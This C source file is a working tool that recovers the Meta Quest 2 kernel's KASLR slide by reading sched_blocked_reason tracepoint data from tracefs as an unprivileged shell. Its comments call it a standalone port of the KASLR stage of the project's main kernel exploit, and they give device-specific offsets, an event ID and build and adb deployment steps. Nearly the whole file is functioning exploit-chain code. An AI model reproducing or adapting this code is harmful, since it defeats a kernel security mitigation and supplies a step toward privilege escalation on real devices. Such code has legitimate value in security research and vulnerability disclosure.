/* Standalone KASLR slide recovery for the Meta Oculus Quest 2 (Snapdragon
 * XR2 "kona"/"hollywood", oculus-linux-kernel 4.19.325), via
 * sched_blocked_reason's tracepoint.
 *
 * Exploit-free: no CVE, no memory corruption, no heap grooming. Reads
 * real, already-slid kernel .text return addresses straight out of
 * /sys/kernel/tracing/per_cpu/cpuN/trace_pipe_raw, which is readable by a
 * completely unprivileged shell on this device (shell's group 3012 is
 * `readtracefs`). This is the *default* KASLR-recovery route used by the
 * main exploit (`slide_leak_kernel_base()` in ../src/exploit/slide.c) --
 * this file is a standalone, dependency-free port of that same logic for
 * isolated testing/iteration, with every constant's derivation documented
 * inline instead of split across offset.h.
 *
 * Self-contained on purpose: no #include of any other file in this
 * project (not common.h, not offset.h, not kernelsnitch/). Every value
 * this file needs is defined and documented below.
 *
 * Build (real device target, static, no Android NDK needed -- confirmed
 * this matches what past scratch builds in this project actually used):
 *   aarch64-linux-gnu-gcc -O2 -static -Wall -Wextra \
 *     kaslr_tracefs_leak.c -o kaslr_tracefs_leak
 *   adb push kaslr_tracefs_leak /data/local/tmp/
 *   adb shell /data/local/tmp/kaslr_tracefs_leak
 *
 * Exit code 0 + prints `base`/`slide` on success, exit code 1 on failure
 * (with a reason printed to stderr).
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

/* ---------------------------------------------------------------------
 * Kernel identity / addressing constants.
 * ---------------------------------------------------------------------
 *
 * KIMAGE_TEXT_BASE: the kernel image's *link-time* (unslid) `_text`
 * virtual address -- i.e. what `_text` would be if KASLR added a slide
 * of 0. Confirmed identical three independent ways: (1) `nm`/System.map
 * on a local rebuild of this exact kernel source+config+toolchain
 * (`4.19.325-cip128-st12-g6e428607392d`, see ../q2_build/), (2) the same
 * value recovered independently via `vmlinux-to-elf`'s own base-address
 * guess run directly against the real device's raw kernel Image (pulled
 * live via a bootloader/recovery path, see ../PORTING_NOTES.md), (3) the
 * real device's own live `dry`-stage diagnostic dump (this project's main
 * exploit binary, run via `adb shell`) computing consistent addresses
 * from it. Not device-specific -- this is the standard ARM64 kernel Image
 * link base for this defconfig, only the *slide added at boot* varies.
 */
#define KIMAGE_TEXT_BASE 0xffffff8008080000ULL

/* ---------------------------------------------------------------------
 * sched_blocked_reason tracepoint identity.
 * ---------------------------------------------------------------------
 *
 * The technique: `sched_blocked_reason`'s `caller` field is
 * `get_wchan(tsk)` (arch/arm64/kernel/process.c) -- a genuine,
 * already-slid kernel .text return address of whatever a blocked task is
 * currently parked inside. Any moderately busy Linux system has kernel
 * worker threads and RCU grace-period threads blocked essentially all
 * the time, so sampling this tracepoint for ~1 second reliably captures
 * their `caller` values. No physical-memory addressing, no privilege,
 * and no defeat of any other KASLR-independent mitigation is needed.
 *
 * Ported from github.com/BuSung-dev/CVE-2026-43499-S25U's `slide.c` (the
 * ftrace ring-buffer raw-page binary parsing format below is *generic*
 * ftrace format, not kernel-version-specific, so directly reusable) --
 * but two of their constants do NOT carry over and were re-derived for
 * this kernel:
 *
 * - Event ID: their kernel uses ID 109 for this tracepoint. Event IDs are
 *   NOT ABI-stable across kernel builds/configs (they're assigned in
 *   registration order, which depends on which tracepoints are compiled
 *   in). Confirmed via reading
 *   `/sys/kernel/tracing/events/sched/sched_blocked_reason/format`'s
 *   `ID:` line directly on this device: **75**, not 109.
 * - Valid slide range: their kernel's KASLR scheme places the slide
 *   within ~2MB of the nominal (unslid) base. This kernel (4.19,
 *   VA_BITS=39, arch/arm64/kernel/kaslr.c's `kaslr_early_init()` "middle
 *   half of VMALLOC" scheme) places the slide anywhere in
 *   [BIT(VA_BITS-3), BIT(VA_BITS-3)+BIT(VA_BITS-2)) = **[64GB, 192GB)**,
 *   always 2MB-aligned (kaslr_early_init rounds to 2MB) -- a much larger,
 *   materially different range. Using the wrong (2MB-scale) bound here
 *   would reject every real sample.
 */
#define SLIDE_TRACEFS_EVENT_ID 75

/* Reference-function offsets from KIMAGE_TEXT_BASE, matched via `nm` on a
 * local rebuild of this exact kernel (see KIMAGE_TEXT_BASE comment).
 * Both are near-permanently-blocked kernel threads present on any live
 * system, so both reliably show up in a short tracefs capture:
 *   worker_thread+152   -- generic kworker main loop (kernel/workqueue.c)
 *   rcu_gp_kthread+1448 -- RCU grace-period thread (kernel/rcu/tree.c)
 * Cross-validating against two independent functions (both must imply
 * the *same* slide) makes a false-positive match essentially impossible
 * -- live-captured 1s of real trace_pipe_raw data during derivation and
 * both, independently, implied the identical slide (0x2e48c00000,
 * ~185GB), 2MB-aligned, inside the theoretical [64GB,192GB) range.
 */
#define SLIDE_TRACEFS_WORKER_THREAD_OFF 0x63a84ULL    /* worker_thread+152 */
#define SLIDE_TRACEFS_RCU_GP_KTHREAD_OFF 0xe4248ULL   /* rcu_gp_kthread+1448 */

/* kaslr_early_init()'s theoretical valid window for the slide itself
 * (BIT(VA_BITS-3) to BIT(VA_BITS-3)+BIT(VA_BITS-2), VA_BITS=39) -- used
 * to reject any candidate slide that isn't even mathematically possible,
 * before trusting a match. */
#define SLIDE_TRACEFS_MIN_SLIDE 0x1000000000ULL   /* 64GB */
#define SLIDE_TRACEFS_MAX_SLIDE 0x3000000000ULL   /* 192GB */

#define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
#define SLIDE_TRACEFS_MAX_SAMPLES 4096

/* ---------------------------------------------------------------------
 * Minimal, self-contained logging (deliberately not pulled in from
 * kernelsnitch/utils.h, so this file has zero dependencies on the rest
 * of the project).
 * --------------------------------------------------------------------- */
#define pr_info(fmt, ...) fprintf(stdout, "[*] " fmt, ##__VA_ARGS__)
#define pr_warn(fmt, ...) fprintf(stderr, "[-] " fmt, ##__VA_ARGS__)
#define pr_ok(fmt, ...) fprintf(stdout, "[+] " fmt, ##__VA_ARGS__)

static int tracefs_write(const char *path, const char *value) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  size_t len = strlen(value);
  ssize_t wrote = write(fd, value, len);
  close(fd);
  return wrote == (ssize_t)len;
}

/* Parses one raw ftrace ring-buffer page (as read directly from
 * trace_pipe_raw), collecting every sched_blocked_reason `caller` value
 * it contains into out[] (up to out_cap). This is generic ftrace binary
 * ring-buffer format (page header: 8-byte timestamp + 8-byte `commit`
 * word whose low 12 bits are the page's used-data length; then a stream
 * of variable-length event records, each starting with a 4-byte header
 * whose low 5 bits are a type/length code: 30=time-extend (skip 8 bytes
 * total), 31=time-stamp (skip 12), 0 or >=29=padding/end-of-page (stop),
 * else record length = code*4 bytes, immediately followed by a 2-byte
 * event ID and then the event's own fields) -- not specific to this
 * kernel version, safe to reuse verbatim for other tracepoints/kernels
 * (only SLIDE_TRACEFS_EVENT_ID and the field offset within the record
 * would need to change). `sched_blocked_reason`'s trace format is
 * `unsigned short common_type; ...; pid_t pid; void *caller; ...` --
 * `caller` sits at fixed offset 16 within the record for this kernel's
 * exact field layout (confirmed via
 * .../sched_blocked_reason/format's `field:` lines). */
static size_t tracefs_parse_page(
    const unsigned char *page, size_t page_len, uint64_t *out, size_t out_cap) {
  if (page_len < 20) {
    return 0;
  }
  uint64_t commit = 0;
  memcpy(&commit, page + 8, sizeof(commit));
  size_t data_len = (size_t)(commit & 0xfffULL);
  size_t end = 16 + data_len;
  if (end > page_len) {
    end = page_len;
  }

  size_t found = 0;
  for (size_t pos = 16; pos + 4 <= end;) {
    uint32_t event_header = 0;
    memcpy(&event_header, page + pos, sizeof(event_header));
    uint32_t type_len = event_header & 0x1fU;
    if (type_len == 30) {
      pos += 8;
      continue;
    }
    if (type_len == 31) {
      pos += 12;
      continue;
    }
    if (type_len == 0 || type_len >= 29) {
      break;
    }
    size_t record_len = (size_t)type_len * 4;
    size_t record = pos + 4;
    if (record + record_len > end) {
      break;
    }
    uint16_t event_id = 0;
    memcpy(&event_id, page + record, sizeof(event_id));
    if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
      uint64_t caller = 0;
      memcpy(&caller, page + record + 16, sizeof(caller));
      /* Sanity filter: a real slid kernel .text pointer's top 16 bits
       * are always 0xffff on this VA_BITS=39 kernel VA layout. */
      if ((caller >> 48) == 0xffff && found < out_cap) {
        out[found++] = caller;
      }
    }
    pos = record + record_len;
  }
  return found;
}

/* Checks whether `caller` is consistent with `ref_off` (a reference
 * function's static offset from KIMAGE_TEXT_BASE) under a valid,
 * theoretically-possible KASLR slide: the implied slide must be 2MB-
 * aligned and fall inside [SLIDE_TRACEFS_MIN_SLIDE, SLIDE_TRACEFS_MAX_SLIDE).
 * Returns the implied slide via *slide_out, or 0/false if inconsistent. */
static int tracefs_slide_from_caller(
    uint64_t caller, uint64_t ref_off, uint64_t *slide_out) {
  uint64_t nominal = KIMAGE_TEXT_BASE + ref_off;
  if (caller < nominal) {
    return 0;
  }
  uint64_t slide = caller - nominal;
  if ((slide % 0x200000ULL) != 0) {
    return 0;
  }
  if (slide < SLIDE_TRACEFS_MIN_SLIDE || slide >= SLIDE_TRACEFS_MAX_SLIDE) {
    return 0;
  }
  *slide_out = slide;
  return 1;
}

/* Runs the full recovery: enables the tracepoint, samples ~1s of
 * trace_pipe_raw on every online CPU, then looks for a sample consistent
 * with worker_thread's offset (primary match) and, if found, checks
 * whether any sample is *also* consistent with rcu_gp_kthread implying
 * the exact same slide (secondary confirmation only -- not required,
 * since a 1s window isn't guaranteed to catch both threads blocking).
 * On success, writes the recovered (already-slid) kernel base to
 * *kaslr_base_out and the slide itself to *kaslr_slide_out, and returns
 * 1. Returns 0 on any failure (reason printed to stderr). */
static int kaslr_tracefs_leak(uint64_t *kaslr_base_out,
                               uint64_t *kaslr_slide_out,
                               int *rcu_confirm_out,
                               size_t *sample_count_out) {
  static const char tracing_on[] = SLIDE_TRACEFS_ROOT "/tracing_on";
  static const char event_enable[] =
      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";

  if (!tracefs_write(tracing_on, "0") ||
      !tracefs_write(event_enable, "1") ||
      !tracefs_write(tracing_on, "1")) {
    pr_warn("tracefs setup failed errno=%d (%s) -- need CONFIG_FTRACE and "
            "read/write access to %s\n",
            errno, strerror(errno), SLIDE_TRACEFS_ROOT);
    return 0;
  }
  sleep(1);
  tracefs_write(tracing_on, "0");

  static uint64_t samples[SLIDE_TRACEFS_MAX_SAMPLES];
  size_t sample_count = 0;

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  for (int cpu = 0; cpu < cpu_count; cpu++) {
    char path[128];
    snprintf(path, sizeof(path),
             SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (fd < 0) {
      continue;
    }
    unsigned char page[4096];
    ssize_t got;
    while ((got = read(fd, page, sizeof(page))) > 0 &&
           sample_count < SLIDE_TRACEFS_MAX_SAMPLES) {
      uint64_t found[64];
      size_t n = tracefs_parse_page(page, (size_t)got, found, 64);
      for (size_t i = 0; i < n && sample_count < SLIDE_TRACEFS_MAX_SAMPLES; i++) {
        samples[sample_count++] = found[i];
      }
    }
    close(fd);
  }
  tracefs_write(event_enable, "0");
  *sample_count_out = sample_count;
  pr_info("collected samples=%zu\n", sample_count);
  if (sample_count == 0) {
    pr_warn("no sched_blocked_reason samples captured\n");
    return 0;
  }

  uint64_t accepted_slide = 0;
  int have_worker = 0;
  for (size_t i = 0; i < sample_count && !have_worker; i++) {
    uint64_t slide = 0;
    if (tracefs_slide_from_caller(
            samples[i], SLIDE_TRACEFS_WORKER_THREAD_OFF, &slide)) {
      accepted_slide = slide;
      have_worker = 1;
    }
  }
  if (!have_worker) {
    pr_warn("no worker_thread-consistent sample found (samples=%zu)\n",
            sample_count);
    return 0;
  }

  int have_rcu_confirm = 0;
  for (size_t i = 0; i < sample_count; i++) {
    uint64_t slide = 0;
    if (tracefs_slide_from_caller(
            samples[i], SLIDE_TRACEFS_RCU_GP_KTHREAD_OFF, &slide) &&
        slide == accepted_slide) {
      have_rcu_confirm = 1;
      break;
    }
  }

  *kaslr_slide_out = accepted_slide;
  *kaslr_base_out = KIMAGE_TEXT_BASE + accepted_slide;
  *rcu_confirm_out = have_rcu_confirm;
  return 1;
}

int main(void) {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  uint64_t kaslr_base = 0, kaslr_slide = 0;
  int rcu_confirm = 0;
  size_t sample_count = 0;

  if (!kaslr_tracefs_leak(&kaslr_base, &kaslr_slide, &rcu_confirm,
                           &sample_count)) {
    pr_warn("kaslr-tracefs-leak-failed\n");
    return 1;
  }

  pr_ok("kaslr-tracefs-leak-ok base=%016llx slide=%016llx rcu_confirm=%d "
        "samples=%zu\n",
        (unsigned long long)kaslr_base, (unsigned long long)kaslr_slide,
        rcu_confirm, sample_count);
  return 0;
}
